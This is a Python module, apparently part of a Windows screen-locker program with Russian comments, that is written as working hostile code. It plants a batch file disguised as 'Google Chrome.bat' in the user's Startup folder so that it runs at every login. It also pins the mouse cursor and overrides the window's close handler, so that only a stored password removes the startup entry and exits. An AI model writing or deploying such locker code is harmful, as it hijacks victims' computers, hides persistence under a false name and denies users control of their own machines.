from tkinter import Button, Entry
import pyautogui
import playsound
import getpass
import os
import sys

from .variables import window, txt

USER_NAME = getpass.getuser()

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))

password = ""

if os.path.exists(os.path.join(CURRENT_DIR, "../credentials.txt")):
    with open(os.path.join(CURRENT_DIR, "../credentials.txt")) as f:
        password = f.readline()
else:
    print("Файл с паролем не найден :(")


def add_to_startup(file_path=""):
    if file_path == "":
        # Взять путь к текущему файлу
        file_path = os.path.dirname(os.path.realpath(__file__))

    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

    with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


def block():
    pyautogui.moveTo(x=680,y=800)
    window.protocol("WM_DELETE_WINDOW", block)
    window.update()


def clicked():
    res = format(txt.get())

    if res == password:
        file_path = '/tmp/file.txt'
        file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
        os.remove(file_path)
        sys.exit()
    else:
        print("Неверный пароль")


def play(sound_file="sound.mp3"):
    if os.path.exists(os.path.join(CURRENT_DIR, f"../{sound_file}")):
        playsound(sound_file, False)
    else:
        print("Аудио файл не найден")